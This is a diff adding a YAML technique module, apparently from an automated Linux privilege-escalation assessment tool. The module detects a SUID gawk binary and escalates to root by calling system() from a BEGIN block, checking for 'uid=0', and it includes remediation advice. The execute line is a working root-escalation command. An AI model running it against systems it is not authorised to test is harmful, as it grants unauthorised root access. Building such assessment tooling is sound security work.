@@ -1,0 +1,26 @@
+# SUID gawk → root (GTFOBins)
+technique: T1548.001
+name: SUID gawk → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: gawk
+execute:
+  command: "{{binary}} 'BEGIN{system(\"id\")}'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID gawk shells out via a BEGIN block. Same primitive as SUID
+    awk; distros that install gawk as the awk provider may leave the
+    SUID bit on gawk directly.
+  remediation: >
+    Remove the SUID bit from gawk.
+  refs: [T1548.001, GTFOBins/gawk]
